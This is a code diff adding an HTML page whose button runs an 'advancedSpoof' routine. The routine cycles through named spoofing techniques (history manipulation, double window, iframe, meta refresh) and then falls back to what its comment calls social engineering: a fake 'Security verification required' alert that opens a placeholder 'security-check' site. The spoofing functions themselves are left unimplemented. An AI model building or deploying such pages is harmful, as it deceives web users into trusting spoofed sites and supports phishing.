@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<body>
+<button onclick="advancedSpoof()">Advanced Combined Method</button>
+
+<script>
+function advancedSpoof() {
+    // Coba multiple methods secara sequential
+    const methods = [
+        historySpoof,
+        doubleWindow,
+        iframeMethod,
+        metaRefreshMethod
+    ];
+    
+    let success = false;
+    for(let method of methods) {
+        if(!success) {
+            try {
+                success = method();
+            } catch(e) {
+                continue;
+            }
+        }
+    }
+    
+    if(!success) {
+        // Fallback ke social engineering
+        alert("Security verification required. Please check the new tab.");
+        window.open("https://your-legit-site.com/security-check", "_blank");
+    }
+}
+
+// Implementasi semua function di sini...
+</script>
+</body>
+</html>
